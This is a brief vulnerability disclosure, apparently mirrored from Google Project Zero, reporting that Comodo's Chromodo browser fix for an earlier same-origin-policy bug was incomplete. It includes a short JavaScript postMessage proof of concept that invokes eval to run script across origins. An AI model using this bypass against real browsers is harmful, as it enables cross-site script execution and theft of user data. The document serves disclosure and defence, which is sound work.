# Comodo "Chromodo" Browser disables same origin policy, Effectively turning off web security

> Reported by taviso@google.com, Feb 2 2016

Comodo's fix for [issue 704](https://github.com/Metnew/uxss-db/tree/master/chromodo/0-704) was incomplete, it's trivial to make the exploit work again like this:

```javascript
window.postMessage(
	JSON.stringify({
		command: "callOuterFunction",
		params: {func: "eval", arguments: ["alert(1)"]}
	}),
	"*"
)
```

Link: https://bugs.chromium.org/p/project-zero/issues/detail?id=713
